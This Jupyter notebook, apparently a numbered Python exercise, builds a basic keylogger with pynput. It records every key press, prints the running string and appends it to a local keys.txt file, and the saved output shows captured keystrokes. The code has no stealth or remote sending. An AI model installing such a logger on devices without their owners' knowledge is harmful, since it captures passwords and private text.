{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 20. Key Logger"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Downloading https://files.pythonhosted.org/packages/de/13/f8d493ae4efe980fa2bc4bd6b5dfaf15ffa91963d0c782478700e0821de3/pynput-1.7.2-py2.py3-none-any.whl (99kB)\n",
      "Requirement already satisfied: six in c:\\users\\mkailas\\anaconda3\\lib\\site-packages (from pynput) (1.13.0)\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.2\n"
     ]
    }
   ],
   "source": [
    "!pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key.ctrl_l\n",
      "Key.ctrl_lKey.ctrl_l\n",
      "Key.ctrl_l\n",
      "Key.ctrl_l\\x03\n",
      "Key.ctrl_l\\x03Key.ctrl_l\n",
      "Key.ctrl_l\n",
      "Key.ctrl_l\\x16\n",
      "Key.ctrl_l\\x16Key.ctrl_l\n",
      "Key.ctrl_l\n",
      "Key.ctrl_lKey.ctrl_l\n",
      "Key.ctrl_l\n",
      "Key.ctrl_lKey.ctrl_l\n",
      "Key.shift\n",
      "Key.shift#\n",
      "Key.shift#Key.space\n",
      "Key.ctrl_l\n",
      "Key.ctrl_l\\x16\n",
      "Key.ctrl_l\\x16Key.shift_r\n",
      "Key.enter\n",
      "Key.enterKey.ctrl_l\n",
      "\\x16\n",
      "\\x16Key.ctrl_l\n",
      "\\x16Key.ctrl_l\\x16\n",
      "Key.shift_r\n",
      "Key.shift_rKey.enter\n",
      "Key.shift\n",
      "Key.shift!\n",
      "Key.shift!Key.shift\n",
      "!\n",
      "!Key.shift\n",
      "!Key.shift!\n",
      "!Key.shift!Key.shift_r\n",
      "Key.enter\n",
      "Key.enterKey.backspace\n",
      "Key.enter\n",
      "Key.enterKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.space\n",
      "Key.backspace\n",
      "Key.backspaceKey.space\n",
      "Key.space\n",
      "Key.spaceKey.shift_r\n",
      "Key.enter\n",
      "Key.enterKey.ctrl_l\n",
      "Key.ctrl_l\n",
      "Key.ctrl_l\\x03\n",
      "Key.ctrl_l\\x03Key.ctrl_l\n",
      "Key.ctrl_l\n",
      "Key.ctrl_l\\x16\n",
      "Key.ctrl_l\\x16Key.enter\n",
      "Key.ctrl_l\n",
      "Key.ctrl_lKey.ctrl_l\n",
      "Key.ctrl_l\n",
      "Key.ctrl_lKey.ctrl_l\n",
      "Key.ctrl_l\n",
      "Key.ctrl_l\\x16\n",
      "Key.ctrl_l\\x16Key.shift_r\n",
      "Key.shift_r\n",
      "Key.shift_rKey.enter\n"
     ]
    }
   ],
   "source": [
    "from pynput.keyboard import Key, Controller,Listener\n",
    "import time\n",
    "keyboard = Controller()\n",
    "\n",
    "\n",
    "keys=[]\n",
    "def on_press(key):\n",
    "    global keys\n",
    "    #keys.append(str(key).replace(\"'\",\"\"))\n",
    "    string = str(key).replace(\"'\",\"\")\n",
    "    keys.append(string)\n",
    "    main_string = \"\".join(keys)\n",
    "    print(main_string)\n",
    "    if len(main_string)>15:\n",
    "        with open('keys.txt', 'a') as f:\n",
    "            f.write(main_string)   \n",
    "            keys= []     \n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False\n",
    "\n",
    "with Listener(on_press=on_press,on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
